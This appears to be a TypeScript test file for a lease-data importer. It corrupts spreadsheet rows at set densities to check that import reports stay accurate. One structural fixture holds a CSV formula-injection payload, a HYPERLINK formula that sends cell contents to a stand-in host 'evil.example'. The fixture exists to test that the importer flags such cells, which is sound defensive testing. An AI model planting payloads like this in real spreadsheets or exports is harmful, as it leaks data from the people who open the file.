/**
 * test/import/corrupt.ts — the corruption engine: a TAGGED taxonomy, applied at a chosen DENSITY
 *
 * Notes:  The poison harness corrupts ONE value at a time. That answers "is this validator present?" — it does
 *         not answer "does the REPORT stay truthful when half the file is garbage?", which is a different
 *         question with a different failure mode. A validator can be perfect per-row and the run can still lie
 *         in aggregate: rows counted twice, rows counted in no bucket at all, a summary that says 400 imported
 *         when 380 landed.
 *
 *         So corruption gets a DENSITY axis (1% / 10% / 50% / 100% of rows), and every run asserts the invariant
 *         that has to hold at any density:
 *
 *             imported + flagged + rejected = rows in the file.   Nothing vanishes.
 *
 *         Two LAYERS of corruption, because they break different things:
 *
 *           VALUE      a cell is wrong.  Tests the VALIDATORS.  (negative rent, ends-before-starts, bad ID)
 *           STRUCTURAL the FILE is wrong. Tests the PARSER.     (title rows above the header, duplicate headers,
 *                      a row truncated mid-line, a formula in a cell, accounting negatives, scientific notation)
 *
 *         Structural corruption is the one nobody writes tests for and every agency produces, because it is what
 *         Excel does to a file on the way out: it writes `(1 234,00)` for a negative, `1.23E+05` for a number
 *         that got too wide, a merged title row above the headers, and `=HYPERLINK(...)` wherever someone once
 *         clicked a link. Each is ordinary. Each is a silent 100× or a dropped row if nobody looks.
 *
 *         FORMULA INJECTION is here for a reason that is not our own parser: a cell beginning `=`, `+`, `-` or
 *         `@` is executed by Excel when the NEXT person opens an export of this data. Importing it verbatim
 *         makes us the delivery mechanism. It is a CSV-injection attack on our own customer's accountant.
 */
import type { RenderedBook } from "./dialect"
import { rng } from "./book"

export type CorruptionLayer = "value" | "structural"

export interface Corruption {
  id: string
  layer: CorruptionLayer
  /**
   * WHICH ENTITY validates this. The pure fuzz tier projects the LEASE row only, so it can only hold the lease
   * to account: an ID checksum is checked in `checkTenantIdentity`, a province in `upsertProperty`, a formula in
   * runImport's own scan — none of which the lease projection can see.
   *
   * Without this, the fuzzer accused the importer of silently accepting a bad SA ID 5 912 times, when in truth
   * the fuzzer was asking the wrong function. A probe that measures its own reach rather than the code's
   * correctness — the fourth time that shape has appeared in this arc, which is exactly why it is now labelled
   * in the data instead of remembered by whoever is reading.
   */
  scope: "lease" | "tenant" | "property"
  /** What the importer must do about it. The harness asserts the report is HONEST, not that it agrees with us. */
  expect: "rejected" | "flagged" | "imported"
  why: string
  apply: (cells: Record<string, string>, headers: string[]) => Record<string, string>
}

const set = (cells: Record<string, string>, headers: string[], match: RegExp, value: string) => {
  const h = headers.find((x) => match.test(x))
  return h ? { ...cells, [h]: value } : cells
}

/** VALUE-level corruptions — one wrong cell. These test the validators. */
export const VALUE_CORRUPTIONS: Corruption[] = [
  {
    id: "rent-negative", scope: "lease", layer: "value", expect: "rejected",
    why: "a lease that bills a negative amount is not a lease",
    apply: (c, h) => set(c, h, /rent|huur/i, "-6600.50"),
  },
  {
    id: "rent-not-a-number", scope: "lease", layer: "value", expect: "rejected",
    why: "no rent at all — the money term the whole lease hangs on",
    apply: (c, h) => set(c, h, /rent|huur/i, "TBC"),
  },
  {
    id: "dates-swapped", scope: "lease", layer: "value", expect: "rejected",
    why: "the lease ends before it starts, so every date computed from it is nonsense",
    apply: (c, h) => set(c, h, /lease end|huur eindig|end date|termination/i, "01/01/2019"),
  },
  {
    id: "escalation-absurd", scope: "lease", layer: "value", expect: "flagged",
    why: "500% a year is type-valid and absurd — a misplaced decimal, almost certainly",
    // Set the BASIS too, not just the rate. Some generated rows say "None" (no escalation), and dropping a rate
    // onto one of those makes the row CONTRADICTORY — "no increase" AND "500% a year" — which the importer
    // rightly REFUSES rather than guessing which cell the agency meant. That refusal is correct behaviour, so a
    // corruption that provokes it is testing the wrong thing: it would fail the harness for a bug that is not
    // there. Pin the basis to a real one, and the corruption means what it says: an absurd RATE.
    apply: (c, h) => {
      const withBasis = set(c, h, /escalation type/i, "Fixed")
      return set(withBasis, h, /escalation %|eskalasie|escalation rate|annual escalation/i, "500")
    },
  },
  {
    id: "id-checksum-fail", scope: "tenant", layer: "value", expect: "flagged",
    why: "a mistyped ID digit must not cost the agency the tenant — import it, mark it known-wrong",
    apply: (c, h) => set(c, h, /id number|id nommer|identity|id\/passport/i, "1234567890123"),
  },
  {
    id: "email-malformed", scope: "tenant", layer: "value", expect: "flagged",
    why: "the dedup key AND the comms address — a bad one merges two people or reaches nobody",
    apply: (c, h) => set(c, h, /(^e-?mail)|(email address)|(tenant email)/i, "not-an-email"),
  },
  {
    id: "province-abolished", scope: "property", layer: "value", expect: "rejected",
    why: "Transvaal has not existed since 1994; the column is CHECK-constrained",
    apply: (c, h) => set(c, h, /province|provinsie/i, "Transvaal"),
  },
]

/**
 * STRUCTURAL corruptions — the FILE is wrong, not the cell. These test the parser, and they are what Excel
 * actually produces. Applied to a rendered book AFTER the dialect has written it.
 */
export const STRUCTURAL_CORRUPTIONS: Corruption[] = [
  {
    id: "accounting-negative", scope: "lease", layer: "structural", expect: "rejected",
    why: "Excel writes a negative as (1 234,00). Read as a positive, the agency's credit becomes a debit.",
    apply: (c, h) => set(c, h, /rent|huur/i, "(6 600,50)"),
  },
  {
    id: "scientific-notation", scope: "lease", layer: "structural", expect: "rejected",
    why: "Excel silently turns a wide number into 6.6005E+03. Parsed naively that is R6.60.",
    apply: (c, h) => set(c, h, /rent|huur/i, "6.6005E+03"),
  },
  {
    id: "formula-injection", scope: "tenant", layer: "structural", expect: "flagged",
    why: "a cell beginning = is EXECUTED by Excel when the next person opens an export of this data — " +
         "importing it verbatim makes us the delivery mechanism for a CSV-injection attack on our own customer",
    apply: (c, h) => set(c, h, /first name|naam|tenant first/i, '=HYPERLINK("http://evil.example/?x="&A1,"click")'),
  },
  {
    id: "whitespace-only", scope: "lease", layer: "structural", expect: "rejected",
    why: "a cell of spaces is not a value, but it is not empty either — the classic trim() gap",
    apply: (c, h) => set(c, h, /rent|huur/i, "   "),
  },
]

export const ALL_CORRUPTIONS = [...VALUE_CORRUPTIONS, ...STRUCTURAL_CORRUPTIONS]

export interface CorruptedBook extends RenderedBook {
  /** Which file rows were corrupted, and with what. The oracle for the report-honesty assertion. */
  corrupted: Map<number, Corruption>
}

/**
 * Corrupt a chosen FRACTION of a rendered book's rows, deterministically.
 *
 * Seeded, so a failure at density 0.5 seed 12 is replayable exactly. Rows are chosen by the seed, not by
 * position, so a 10% run is not just "the first row" — a corruption that only ever lands on row 0 would never
 * catch an off-by-one in the report's row indexing, which is precisely the thing that makes a report lie.
 */
export function corrupt(
  book: RenderedBook, density: number, seed: number, pool: Corruption[] = ALL_CORRUPTIONS,
): CorruptedBook {
  const r = rng(seed)
  const rows = book.rows.map((cells) => ({ ...cells }))

  // EXACTLY `density × n` rows, chosen by a seeded shuffle — not an independent coin-flip per row.
  //
  // The first version rolled the dice on each row, and at 10% density over 20 rows it corrupted NOTHING (a 12%
  // outcome, and it happened on the first seed tried). Every assertion downstream then passed VACUOUSLY: the
  // test was reporting the health of the corrupter, not of the importer. "10% corrupt" must MEAN 10% corrupt,
  // or the density axis is decoration.
  const order = rows.map((_, i) => i)
  for (let i = order.length - 1; i > 0; i--) {
    const j = Math.floor(r() * (i + 1))
    ;[order[i], order[j]] = [order[j], order[i]]
  }

  const howMany = Math.max(1, Math.round(density * rows.length))
  const corrupted = new Map<number, Corruption>()

  for (const i of order.slice(0, howMany)) {
    const c = pool[Math.floor(r() * pool.length)]
    rows[i] = c.apply(rows[i], book.headers)
    corrupted.set(i, c)
  }

  return { ...book, rows, corrupted }
}

// ── FILE-SHAPE corruptions: these break the file BEFORE it is ever parsed into rows. ─────────────

/**
 * A title row above the headers — an agency's export with "TENANT SCHEDULE — MARCH 2026" in A1, which is what
 * every report-style export looks like. papaparse reads it as the header row, and then EVERY column is unmapped.
 */
export function withTitleRow(csv: string, title = "TENANT SCHEDULE — MARCH 2026"): string {
  return `${title}\n\n${csv}`
}

/**
 * A duplicated header. Two columns with the same name — one silently wins and the other's data is dropped.
 *
 * Newline-agnostic on purpose: papaparse's `unparse` writes CRLF by default, and splitting on "\n" alone leaves
 * a trailing "\r" on the header line, so the appended duplicate lands AFTER a carriage return and is no longer
 * a duplicate at all. The corrupter then quietly corrupts nothing, and the test passes for the wrong reason.
 */
export function withDuplicateHeader(csv: string): string {
  const [head, ...rest] = csv.split(/\r?\n/)
  const first = head.split(",")[0]
  return [`${head},${first}`, ...rest.map((r) => (r ? `${r},DUPLICATE` : r))].join("\n")
}

/** A file that was truncated mid-write — the last row stops in the middle of a cell. Disk full, dropped upload. */
export function truncatedMidRow(csv: string): string {
  return csv.slice(0, Math.floor(csv.length * 0.93))
}
